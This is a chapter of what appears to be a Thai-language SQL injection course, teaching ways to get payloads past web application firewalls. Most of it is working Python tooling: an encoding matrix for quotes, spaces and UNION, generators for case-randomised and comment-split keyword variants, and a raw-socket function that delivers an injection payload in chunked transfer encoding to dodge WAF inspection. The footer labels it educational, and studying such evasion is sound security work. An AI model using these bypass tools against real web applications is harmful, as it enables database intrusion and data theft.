# Part 093: Payload Encoding Matrix

## ภาพรวม

Matrix ครบถ้วน encoding techniques สำหรับ bypass WAF/filter

**ขั้นตอนที่ 1466-1480**

---

## 1466. Encoding Taxonomy

```
Encoding Types:

1. URL Encoding:     %27 = '
2. Double URL:       %2527 = %27 = '
3. HTML Entity:      &#x27; = '
4. Unicode:          ' = '
5. Hex:              0x27 = '
6. Base64:           (ใช้ใน BLOB/CONVERT)
7. SQL Hex:          CHAR(39) = '
8. Unicode wide:     %u0027
9. UTF-8 multi-byte: %c0%a7 (overlong)
10. Null byte:       %00
```

---

## 1467. URL Encoding Matrix

```python
ENCODING_MATRIX = {
    "'": [
        "'",      # ตรงๆ
        "%27",    # URL encode
        "%2527",  # double URL
        "\\'",    # escaped
        "''  ",   # SQL double quote
        "'", # Unicode
        "&#x27;", # HTML entity
        "&#39;",  # HTML decimal
    ],
    " ": [
        " ",     # space
        "+",     # URL encoded space
        "%20",   # URL
        "%09",   # tab
        "%0a",   # newline
        "%0d",   # CR
        "/**/",  # SQL comment
        "/**_**/", # comment variation
        "%0b",   # vertical tab
        "%0c",   # form feed
    ],
    "=": [
        "=",
        "%3d",
        " LIKE ",
    ],
    "#": [
        "#",
        "%23",
        "-- ",
        "--+",
        "-- -",
        "/*\n*/",
    ],
    "UNION": [
        "UNION",
        "union",
        "UnIoN",
        "UN/**/ION",
        "UN%09ION",
        "/*!UNION*/",
        "/*!50000UNION*/",
        "UNI%00ON",
        "UNIO%4e",  # N = 0x4e
    ],
}

def encode_payload(payload: str, technique: str = 'url') -> str:
    result = payload
    for char, encodings in ENCODING_MATRIX.items():
        if technique == 'url' and len(encodings) > 1:
            result = result.replace(char, encodings[1])  # use 1st alternate
        elif technique == 'double_url' and len(encodings) > 2:
            result = result.replace(char, encodings[2])
    return result
```

---

## 1468. Case Variation + Comment Injection

```python
import random
import re

SQL_KEYWORDS = [
    'SELECT', 'FROM', 'WHERE', 'UNION', 'AND', 'OR',
    'INSERT', 'UPDATE', 'DELETE', 'DROP', 'TABLE',
    'HAVING', 'GROUP', 'ORDER', 'BY', 'LIMIT',
]

def randomize_case(keyword: str) -> str:
    """UNION -> UnIoN (random)"""
    return ''.join(
        c.upper() if random.random() > 0.5 else c.lower()
        for c in keyword
    )

def inject_comments(payload: str) -> str:
    """UN/**/ION SE/**/LECT"""
    for kw in SQL_KEYWORDS:
        if kw in payload.upper():
            # Split keyword in half and inject comment
            mid = len(kw) // 2
            broken = kw[:mid] + '/**/' + kw[mid:]
            payload = re.sub(kw, broken, payload, flags=re.IGNORECASE)
    return payload

def generate_bypass_variants(payload: str) -> list:
    variants = [payload]
    
    # Case variation
    for kw in SQL_KEYWORDS:
        if kw.lower() in payload.lower():
            v = re.sub(kw, randomize_case(kw), payload, flags=re.IGNORECASE)
            variants.append(v)
    
    # Comment injection
    variants.append(inject_comments(payload))
    
    # URL encoding
    variants.append(payload.replace(' ', '%20').replace("'", '%27'))
    
    # Tab instead of space
    variants.append(payload.replace(' ', '\t'))
    
    # Version comment
    variants.append(payload.replace('UNION', '/*!50000UNION*/'))
    
    return list(set(variants))
```

---

## 1469. Chunked Transfer Encoding Bypass

```python
import socket

def chunked_sqli(host: str, path: str, payload: str):
    """
    ส่ง payload แบบ chunked transfer encoding
    บาง WAF ไม่ reassemble chunks ก่อน inspect
    """
    body = f"param=value&search={payload}"
    
    # แบ่ง body เป็น chunks เล็กๆ
    chunk_size = 3
    chunks = [body[i:i+chunk_size] for i in range(0, len(body), chunk_size)]
    
    raw = f"POST {path} HTTP/1.1\r\n"
    raw += f"Host: {host}\r\n"
    raw += "Transfer-Encoding: chunked\r\n"
    raw += "Content-Type: application/x-www-form-urlencoded\r\n"
    raw += "Connection: close\r\n\r\n"
    
    for chunk in chunks:
        raw += f"{len(chunk):x}\r\n{chunk}\r\n"
    raw += "0\r\n\r\n"  # final chunk
    
    sock = socket.socket()
    sock.connect((host, 80))
    sock.send(raw.encode())
    response = b''
    while True:
        data = sock.recv(4096)
        if not data:
            break
        response += data
    sock.close()
    return response.decode(errors='ignore')
```

---

## สรุป

Payload Encoding Matrix:
- **URL/Double URL** - %27, %2527
- **Case variation** - UnIoN
- **Comment injection** - UN/**/ION
- **Space alternatives** - tab, newline, comment
- **Version comments** - /*!50000UNION*/
- **Chunked transfer** - bypass WAF inspection

---

*Part 093 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
